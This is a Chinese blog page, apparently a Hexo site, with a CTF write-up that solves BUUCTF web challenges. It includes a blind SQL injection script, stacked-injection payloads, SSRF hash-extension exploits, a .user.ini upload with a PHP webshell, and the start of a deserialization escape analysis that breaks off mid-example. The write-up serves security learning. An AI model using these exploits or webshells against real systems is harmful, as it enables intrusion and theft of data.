@@ -1,0 +1,1573 @@
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      buuctf刷题记录 | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《buuctf刷题记录》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2019/09/07/buuctf刷题记录/" itemprop="url">
+		buuctf刷题记录
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2019/09/07/buuctf刷题记录/" itemprop="url">
+		<time datetime="2019-09-07T02:02:57.000Z" itemprop="datePublished">
+	  		2019-09-07
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2019/09/07/buuctf刷题记录/" itemprop="url">
+		<time datetime="2019-09-07T02:02:57.000Z" itemprop="dateUpdated">
+	  		2019-10-16
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/writeup/" class=" ">
+			writeup
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2019/09/07/buuctf刷题记录/_visitors" data-url="/2019/09/07/buuctf刷题记录/" data-title="buuctf刷题记录">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2019/09/07/buuctf刷题记录/_likes" data-url="/2019/09/07/buuctf刷题记录/" data-title="buuctf刷题记录" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近感觉自己菜出来新境界。。。刷点题来证明我还存在。。。言归正传。开刷</p>
+<h2 id="hack-world"><a href="#hack-world" class="headerlink" title="hack world"></a>hack world</h2><p><strong>知识点：sql布尔盲注，bypass</strong><br>进入题目，发现这是典型的sql布尔盲注，题目给出了表名和列名都是flag，用burp进行fuzz测试发现存在过滤。</p>
+<pre class="line-numbers language-html"><code class="language-html">过滤了 or limit delete update and * # -- &amp; 空格 for ; || +
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>因为没有注释符sql语句不能被截断，所以只能来试试传入sql运算语句，测试能否被执行。测试发现2/1返回的是id=2的值，<br>当传递2/2是，返回的是id=1时的值，所以发现运算可以被执行，这就是注入点，像if、sleep函数等<br>这里说一下sleep函数，直接看测试<br><img src="https://s2.ax1x.com/2019/09/07/nQIttP.png" alt="nQIttP.png"><br>false执行时间为0,true返回时间是1，所以可以进行延时注入。<br>最后上exp：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">import</span> requests <span class="token keyword">as</span> rq
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> time
+reload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
+sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>
+
+
+url<span class="token operator">=</span><span class="token string">'http://99449ee6-0e39-42e0-bc66-e046d431b3ef.node1.buuoj.cn/index.php'</span>
+flag<span class="token operator">=</span><span class="token string">""</span>
+
+headers<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        post<span class="token operator">=</span> <span class="token string">"if((ascii(substr((select(flag)from(flag)),"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",1))="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"),1,2)"</span>
+        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span>post<span class="token punctuation">}</span>
+        res<span class="token operator">=</span>rq<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">print</span> res<span class="token punctuation">.</span>text
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"glzjin"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+            <span class="token keyword">print</span> flag
+            <span class="token keyword">break</span>
+<span class="token comment" spellcheck="true"># print flag</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="esaysql"><a href="#esaysql" class="headerlink" title="esaysql"></a>esaysql</h2><p><strong>知识点： 堆叠注入，sql_mode参数的设置</strong><br>经过测试发现是堆叠注入，查库名：<br>query=1;show databases;<br>得到ctf；<br>查表名：<br>query=1;show tables;<br>得到Flag<br>查列名：<br>query=1;desc Flag;<br>发现被过滤返回Nonono.<br>尝试编码，发现gg凉了，凉的透透的。。。<br>flag被过滤了。<br>尝试预编译和改表结构。都不行，只能去找writeup了。。。<br>新的知识点：<br>mysql中<code>sql_mode</code>参数的设置。<br>通过输入的字符串串可以大致判断出后端逻辑是:<br><code>$query||FLAG</code><br>在<code>sql_mode</code>，可以通过将其值设置为<code>PIPES_AS_CONCAT</code>改变<code>||</code>的作⽤为拼接字符串，此时随便输⼊⼀串字符串便能返回该字符串与FLAG拼接的内容。<br>payload：</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>非预期解：</p>
+<pre class="line-numbers language-html"><code class="language-html">*，1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样把Flag表中的所有数据都查出来。flag就出来了。。</p>
+<h2 id="ssrf-me"><a href="#ssrf-me" class="headerlink" title="ssrf me"></a>ssrf me</h2><p><strong>知识点： ssrf,哈希拓展攻击</strong><br>打开题目发现源码：</p>
+<pre class="line-numbers language-html"><code class="language-html">#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding('latin1')
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)#密钥16位
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+        if (self.checkSign()):
+            if "scan" in self.action:
+                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
+                resp = scan(self.param)#读param文件
+                if (resp == "Connection Timeout"):
+                    result['data'] = resp# 写入文件
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result['code'] = 200
+            if "read" in self.action:
+                f = open("./%s/result.txt" % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+            if result['code'] == 500:
+                result['data'] = "Action Error"
+        else:
+            result['code'] = 500
+            result['msg'] = "Sign Error"
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign): #检查签名
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route("/geneSign", methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get("param", ""))
+    action = "scan"
+    return getSign(action, param)
+
+
+@app.route('/De1ta',methods=['GET','POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get("action"))
+    param = urllib.unquote(request.args.get("param", ""))
+    sign = urllib.unquote(request.cookies.get("sign"))
+    ip = request.remote_addr
+    if(waf(param)):
+        return "No Hacker!!!!"
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route('/')
+def index():
+    return open("code.txt","r").read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return "Connection Timeout"
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()#密钥+参数+action
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith("gopher") or check.startswith("file"):
+        return True
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0',port=80)
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通读源码发现要想获得flag需要读取flag.txt,要想读取读取flag.txt。要把flag.txt写到自己目录下的result.txt。要想写需要’scan’在参数param里，并且（密钥+参数+action）加密后需要等于sign。<br>首先可以获取签名。通过访问geneSign可以获取。<br>方法一（非预期）<br>首先我们发现获取签名时，我们可以控制param，加密（密钥+参数+action）参数可控，检测签名时，param和action可控，但param只能等于flag.txt,加密（密钥+参数+action）。我们可以在获取签名时，直接获得flag.txtread的签名，这时签名是（密钥+flag.txtreadscan），我们直接获得可读可写的签名，我们在读flag时我们可以控制action这时，action等于readscan时，签名仍然是（密钥+flag.txtreadscan）。直接获取flag。（设计缺陷）<br>exp：</p>
+<pre class="line-numbers language-html"><code class="language-html">#coding=utf-8
+import requests
+import hashlib
+url ='http://b08adef7-1e07-4c3e-8cad-382566be0694.node1.buuoj.cn/De1ta?param=flag.txt'
+url1='http://b08adef7-1e07-4c3e-8cad-382566be0694.node1.buuoj.cn/geneSign?param=flag.txtread'
+res1=requests.get(url1)# 获取密文
+print res1.text
+cookies={
+    'action':'readscan',
+    'sign':res1.text
+}
+res=requests.get(url,cookies=cookies)
+print res.text
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>方法二<br>通过签名我们很容易想到哈希拓展攻击，题中给出了密文16位，和参数flag.txt,在 <code>/geneSign?param=flag.txt</code> 中可以获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code> 的值,而目标则是获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;)</code> 的值。</p>
+<ul>
+<li>使用 hashpump 即可<pre class="line-numbers language-html"><code class="language-html">root@peri0d:~/HashPump# hashpump
+Input Signature: 8370bdba94bd5aaf7427b84b3f52d7cb
+Input Data: scan
+Input Key Length: 24(把flag.txt当成密钥的一部分)
+Input Data to Add: read
+d7163f39ab78a698b3514fd465e4018a
+scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+exp :</li>
+</ul>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+
+url = 'http://b08adef7-1e07-4c3e-8cad-382566be0694.node1.buuoj.cn/De1ta?param=flag.txt'
+
+cookies = {
+  'sign': 'd7163f39ab78a698b3514fd465e4018a',
+  'action': 'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read',
+  }
+
+res = requests.get(url=url, cookies=cookies)
+print(res.text)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="suctf2019-CheckIn"><a href="#suctf2019-CheckIn" class="headerlink" title="suctf2019 CheckIn"></a>suctf2019 CheckIn</h2><p><strong>知识点：变形马，.user.ini</strong><br>进入题目，发现是个文件上传，可以上传jpg、png等文件，限制了php文件，而且还判断了上传的文件头，使用exif_image来判断的，这个很容易绕过，直接随便加一个图片文件头就行。上传成功后返回你目录下的所有文件。尝试上传图片马，发现检测<code>&lt;?</code>这个，这里用因为不能出现<code>&lt;?</code> 所以用<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>来绕过。<br>但是图片马上传成功了，怎么解析呢？？？想到了<code>.htaccess</code>文件，但是文件不让上传，新的方式（其实是老姿势了）：<br><code>.user.ini</code><br>什么是<code>.user.ini</code>呢？<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。（所以要执行的马要在<code>.user.ini</code>的同级或子目录下。）<br>和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。<br>除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。<br>在.user.ini可以指定<code>auto_append_file</code>、<code>auto_prepend_file</code><br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中</p>
+<pre class="line-numbers language-html"><code class="language-html">auto_prepend_file=1.png //建议改为绝对路径
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>需要三个文件一个正常访问的php文件1.php， <code>.user.ini</code>,和1.png（图片马），访问<code>1.php</code>即可执行马。（记住是php文件）<br><code>.user.ini</code>的前提是含有<code>.user.ini</code>的文件夹下需要有正常的php文件。<code>不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。只能在这种运行方式下才能执行.user.ini</code>。（真坑）这里对应的phpstudy里的nts模式<br>exp:</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+import base64
+
+url = "http://cdcdbc1e-ae32-4727-9850-a65464dfeecd.node1.buuoj.cn"
+
+
+# userini = b'''#define width 10
+# #define height 10
+# auto_prepend_file=alex.jpg
+# '''
+userini = b'''GIF89a
+auto_prepend_file=alex.jpg
+'''
+
+# shell =  b'''#define width 10
+# #define height 10
+# <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>'''
+shell =  b'''GIF89a
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>'''
+
+files = [('fileUpload',('.user.ini',userini,'image/jpeg'))]
+
+data = {"upload":"Submit"}
+
+proxies = {"http":"http://127.0.0.1:8080"}
+print("upload .user.ini")
+r = requests.post(url=url, data=data, files=files)#proxies=proxies)
+
+print(r.text) 
+
+print("upload alex.jpg")
+
+files = [('fileUpload',('alex.jpg',shell,'image/jpeg'))]
+r = requests.post(url=url, data=data, files=files)
+print(r.text)
+
+url1='http://cdcdbc1e-ae32-4727-9850-a65464dfeecd.node1.buuoj.cn/uploads/fd40c7f4125a9b9ff1a4e75d293e3080/'
+res = requests.get(url=url1)
+print '---------------------'
+print(res.text)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p><strong>知识点：数组绕过正则，改变序列化字符串长度导致反序列化漏洞，字符逃逸</strong></p>
+<p>这个题太经典了。。。（有点扯了，回归正题）<br>进入题目发现是个登陆框。猜测存在注册，访问register.php,注册账号，然后登陆进入，需要修改个人信息。修改信息后，发现我们的信息显示出来，因为上传图片并显示了图片，查看源代码，发现图片是被base64读出来的，然后显示出来的。<br>测试一下，并没有什么发现。。。猜测有源码，用工具扫一下。。。 真死亡，都是响应。被指定页面了，死亡。。。<br>手试一下，<a href="http://www.zip,emmm还真有。。。然后就是代码审计了。" target="_blank" rel="noopener">www.zip,emmm还真有。。。然后就是代码审计了。</a><br>可以知道flag在config.php。<br>首先我们发现对个人的基本信息存在数组中，然后进行了序列化，把序列化后的值存入数据库，然后显示数据时是把数据从数据库中取出来，进行反序列化，然后显示出来，这里我们可以注意到<code>file_get_contents()</code>函数读取我们上传的图片内容然后显示。这里面思路已经很明显了，把<code>$profile</code>数组的photo改为config.php,我们就可以成功获取flag了。<br>关键代码：</p>
+<pre class="line-numbers language-html"><code class="language-html">//存数据
+move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+$profile['phone'] = $_POST['phone'];
+$profile['email'] = $_POST['email'];
+$profile['nickname'] = $_POST['nickname'];
+$profile['photo'] = 'upload/' . md5($file['name']);
+$user->update_profile($username, serialize($profile));
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html">//取数据
+$profile = unserialize($profile);
+$phone = $profile['phone'];
+$email = $profile['email'];
+$nickname = $profile['nickname'];
+$photo = base64_encode(file_get_contents($profile['photo']));
+?>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后继续审计源码。我们发现我们传入数据,都需要进入filter函数进入过滤。这里过滤了单引号和反斜线。</p>
+<pre class="line-numbers language-html"><code class="language-html">public function filter($string) {
+        $escape = array('\'', '\\\\');
+        $escape = '/' . implode('|', $escape) . '/';
+        $string = preg_replace($escape, '_', $string);
+
+        $safe = array('select', 'insert', 'update', 'delete', 'where');
+        $safe = '/' . implode('|', $safe) . '/i';
+        return preg_replace($safe, 'hacker', $string);
+    }
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后sql注入就不行了。所以问题肯定在反序列化那里。</p>
+<p>然后这我就不会了。下面是重点了。<br>我们输入的信息都要被检测：</p>
+<pre class="line-numbers language-html"><code class="language-html">if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) {
+
+        $username = $_SESSION['username'];
+        if(!preg_match('/^\d{11}$/', $_POST['phone']))
+            die('Invalid phone');
+
+        if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+            die('Invalid email');
+
+        if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+            die('Invalid nickname');
+
+        $file = $_FILES['photo'];
+        if($file['size'] &lt; 5 or $file['size'] > 1000000)
+            die('Photo size error');
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们注意了，仔细观察第一个正则。没有匹配到开头结尾都是数字的连续十一位的数字，就die了。没有绕过方法。第二个正则，没有匹配到开头为<code>[_a-zA-Z0-9]</code>中的字符一到十位连接<code>@</code>符再连接<code>[_a-zA-Z0-9]</code>中的字符一到十位连接<code>.</code>再连接<code>[_a-zA-Z0-9]</code>中的字符一到十位，就die了。没有任何绕过方法。第三个判断，先是匹配到不是<code>[a-zA-Z0-9_]</code>字符中的任意字符就返回真，再判断长度小于10，在这里当preg_match处理数组时，会报错，数组可以绕过strlen的长度判断。所以这里数组可以绕过对nickname的限制。</p>
+<p>然后在看代码：</p>
+<pre class="line-numbers language-html"><code class="language-html">$user->update_profile($username, serialize($profile));
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html">public function update_profile($username, $new_profile) {
+        $username = parent::filter($username);
+        $new_profile = parent::filter($new_profile);
+
+        $where = "username = '$username'";
+        return parent::update($this->table, 'profile', $new_profile, $where);
+    }
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结合filter函数，这里把序列化的值，传入filter进行过滤，将序列化值里的含有<code>$safe</code> 危险字符替换为hacker。这里有个知识点：反序列化字符逃逸。<br>先测试一个例子：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$s='s:10:"wherealex""';
+$sss= unserialize($s);
+echo $sss;
+echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>";
+$s1='s:10:"hackeralex""';
+$sss1= unserialize($s1);
+echo $sss1;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到：</p>
+<pre class="line-numbers language-html"><code class="language-html">wherealex"
+hackeralex
